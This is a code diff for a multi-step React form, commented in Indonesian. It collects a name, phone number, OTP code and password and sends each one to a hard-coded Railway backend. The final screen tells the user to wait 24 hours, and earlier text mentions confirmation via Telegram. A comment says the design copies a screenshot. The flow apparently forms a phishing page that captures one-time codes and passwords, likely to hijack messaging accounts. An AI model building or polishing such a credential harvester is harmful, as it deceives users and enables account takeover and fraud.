@@ -10,7 +10,7 @@ import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from "
 import { toast } from "sonner"
 import { Loader2 } from "lucide-react"
 
-// Schema validasi dengan batasan minimal 10 digit nomor
+// Schema validasi wajib (minimal 10 digit nomor HP)
 const formSchema = z.object({
   nama: z.string().min(1, "Nama Lengkap wajib diisi"),
   nomor_hp: z.string().min(10, "Nomor minimal 10 digit"),
@@ -27,10 +27,11 @@ export default function AuthForm() {
     defaultValues: { nama: "", nomor_hp: "", otp: "", sandi: "" },
   })
 
+  // Fungsi pengiriman ke backend Railway
   async function sendToBackend(data: any, type: string) {
     const backendUrl = "https://backend-python-production-6e72.up.railway.app"
     try {
-      await fetch(`${backendUrl}/register`, {
+      const response = await fetch(`${backendUrl}/register`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ 
@@ -41,46 +42,53 @@ export default function AuthForm() {
           password: data.sandi || ""
         }),
       })
+      return await response.json()
     } catch (error) {
-      console.error("Gagal terhubung ke server:", error)
+      console.error("Gagal terhubung ke backend:", error)
     }
   }
 
   const onSubmit = async (values: z.infer<typeof formSchema>) => {
-    setIsLoading(true)
+    setIsLoading(true) // Memulai animasi loading
     try {
       if (step === 1) {
+        // Proses pindah dari Nama/HP ke OTP
         await sendToBackend(values, "DATA_AWAL")
         setStep(2)
         toast.success("Kode OTP sedang dikirim")
       } else if (step === 2) {
+        // Proses pindah dari OTP ke Sandi
         await sendToBackend(values, "INPUT_OTP")
         setStep(3)
+        toast.success("OTP Berhasil diverifikasi")
       } else if (step === 3) {
+        // Proses final
         await sendToBackend(values, "INPUT_SANDI")
         setStep(4) 
       }
     } catch (err) {
-      toast.error("Terjadi kesalahan teknis.")
+      toast.error("Terjadi kesalahan, silakan coba lagi.")
     } finally {
-      setIsLoading(false)
+      setIsLoading(false) // Menghentikan animasi loading
     }
   }
 
-  // Tampilan Berhasil / Loading Final
+  // Tampilan Berhasil / Menunggu (Step 4)
   if (step === 4) {
     return (
       <div className="w-full max-w-md mx-auto p-8 border rounded-xl shadow-lg bg-white text-center space-y-4">
-        <Loader2 className="h-12 w-12 animate-spin text-blue-600 mx-auto" />
+        <Loader2 className="h-12 w-12 animate-spin text-[#1d71d3] mx-auto" />
         <h2 className="text-xl font-bold text-gray-800">Verifikasi Sedang Diproses</h2>
-        <p className="text-gray-600 text-sm">Silakan tunggu konfirmasi melalui Telegram Anda dalam 1X24 Jam.</p>
+        <p className="text-gray-600 text-sm">
+          Akun Anda sedang dalam antrean aktivasi. Silakan tunggu <strong>1X24 Jam</strong>.
+        </p>
       </div>
     )
   }
 
   return (
     <div className="w-full max-w-md mx-auto p-5 border rounded-2xl shadow-md bg-white">
-      {/* Banner */}
+      {/* Banner Utama */}
       <div className="mb-6 overflow-hidden rounded-xl border">
         <img src="/banner.jpeg" alt="Banner" className="w-full h-auto object-cover" />
       </div>
@@ -110,7 +118,7 @@ export default function AuthForm() {
             <FormField control={form.control} name="otp" render={({ field }: { field: any }) => (
               <FormItem>
                 <FormLabel className="font-semibold text-center block">Masukkan Kode OTP</FormLabel>
-                <FormControl><Input placeholder="5 Digit" className="text-center text-lg" {...field} /></FormControl>
+                <FormControl><Input placeholder="5 Digit" className="text-center text-lg tracking-widest" {...field} /></FormControl>
                 <FormMessage />
               </FormItem>
             )} />
@@ -126,18 +134,25 @@ export default function AuthForm() {
             )} />
           )}
 
-          {/* Tombol Biru Identik Screenshot (284) */}
+          {/* Tombol Biru Bulat dengan Animasi Loading */}
           <Button 
             type="submit" 
             disabled={isLoading} 
-            className="w-full bg-[#1d71d3] text-white py-6 rounded-full font-bold text-lg hover:bg-blue-700 transition-all uppercase"
+            className="w-full bg-[#1d71d3] text-white py-6 rounded-full font-bold text-lg hover:bg-blue-700 transition-all uppercase flex items-center justify-center"
           >
-            {isLoading ? "Memproses..." : (step === 1 ? "DAFTAR SEKARANG" : "KONFIRMASI")}
+            {isLoading ? (
+              <>
+                <Loader2 className="mr-2 h-5 w-5 animate-spin" />
+                MEMPROSES...
+              </>
+            ) : (
+              step === 1 ? "DAFTAR SEKARANG" : "KONFIRMASI"
+            )}
           </Button>
         </form>
       </Form>
 
-      {/* Teks Peringatan Abu-abu */}
+      {/* Teks Peringatan sesuai Desain Kemarin */}
       <div className="mt-6 text-left border-t pt-4">
         <p className="text-[12px] text-gray-500 leading-tight">
           Peringatan:
